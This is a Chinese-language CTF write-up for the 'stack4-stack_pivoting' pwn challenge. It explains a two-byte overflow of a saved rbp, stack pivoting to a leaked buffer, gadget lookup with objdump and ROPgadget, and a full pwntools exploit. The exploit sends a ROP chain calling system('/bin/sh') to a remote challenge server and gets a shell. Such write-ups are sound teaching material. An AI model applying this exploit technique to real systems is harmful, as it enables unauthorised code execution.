---
title: Lilac Pwn stack4-stack_pivoting Writeup
date: 2020-11-01 14:16:03
tags:
- CTF刷题
- PWN
- ROP
- 栈溢出
- 栈迁移
categories: 竞赛
mathjax: true
---

[题目链接](http://pwn.hitctf.cn:8000/challenges)

<!-- more -->

![20201101102142](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102142.png)

文件类型是 64 位 ELF。

![20201101102217](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102217.png)

开了 NX 保护。

用 IDA64 查看一下：

![20201101102400](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102400.png)

![20201101102415](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101102415.png)

可以看到 print_name 最多只能溢出 2 个字节。

也就是说只能覆盖 rbp 的最低 2 个字节。

此时需要使用**栈迁移**的技巧。

此题相对容易，因为已经给出了 buf 的地址，我们只需要把 main 函数栈帧的 rbp 迁移到 buf 处，然后在 buf 处构造 ROP chain 即可。

原来 print_name 栈帧的栈底指向 main 栈帧的栈底。

```
                        
            high address      
                        +--------------------+ <--+ 
               +------> |    previous rbp    |    |
               |        +--------------------+    |
               |        |       ......       |    |
               |        +--------------------+    | main()
               |        |        buf         |    |
               |        +--------------------+    |
               |        |   return address   |    |
               |        +--------------------+ <--+
               +------- |    previous rbp    |    |
                        +--------------------+    |
                        |       ......       |    | print_name()
                        +--------------------+    |
                        |        dest        |    |
                        +--------------------+ <--+
            low address       

```

覆盖后 main 栈帧的栈底迁移到 buf，然后在 buf 上构造 ROP chain，这样 main 函数返回后就去执行 ROP chain 了。

```
                        
            high address      
                        +--------------------+      
                        |    previous rbp    |     
                        +--------------------+     
                        |       ......       |     
                        +--------------------+     
                        |      ROP chain     |     
                        +--------------------+ <--+     
               +------> |        buf         |    |
               |        +--------------------+    | main()
               |        |   return address   |    |
               |        +--------------------+ <--+
               +------- |    previous rbp    |    |
                        +--------------------+    |
                        |       ......       |    | print_name()
                        +--------------------+    |
                        |        dest        |    |
                        +--------------------+ <--+
            low address       

```

```shell
objdump -d stack4 | grep 'plt'
```

![20201101122715](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101122715.png)

system 函数的地址为 `0x400600`。

```shell
ROPgadget --binary stack4 --only "pop|ret" | grep "rdi"
```

![20201101122941](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101122941.png)

`pop rdi; ret` 的地址为 `0x4008a3`。

```shell
ROPgadget --binary stack4 --string "/bin/sh"
```

![20201101123241](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101123241.png)

字符串 "/bin/sh" 的地址为 `0x4008c9`。

所以 payload 为 `fake rbp (随便填)` + `pop rdi; ret` + `"/bin/sh"` + `system` + `填充16个字节` + `buf 的地址`

print_name 中 dest 与 rbp 的距离为 48 个字节，`fake rbp (随便填)` + `pop rdi; ret` + `"/bin/sh"` + `system` 有 32 个字节，因此还需填充 16 个字节才到 rbp。然后 `buf 的地址` 只能覆盖 rbp 的最低两个字节，但是足够了，因为 main 函数中 buf 到 rbp 的距离为 256 个字节。

exp 如下：

```python
from pwn import *
import re

# context.log_level = "debug"

# p = process("./stack4")
p = remote("47.94.239.235", 2024)

p.recvuntil(":")
buf_addr = p.recvuntil("\n")
buf_addr = int(buf_addr[-15:-1], 16) # buf 的地址
# print(hex(addr))

poprdi_addr = 0x4008a3
binsh_addr = 0x4008c9
system_addr = 0x400600


payload = flat([p64(0xdeadbeef), p64(poprdi_addr), p64(binsh_addr), p64(system_addr), 'a'*16, p64(buf_addr) ])

p.sendlineafter("plz", payload)

p.interactive()

```

![20201101124821](https://raw.githubusercontent.com/WuTao18/images/master/notes/2020/20201101124821.png)

成功拿到 shell。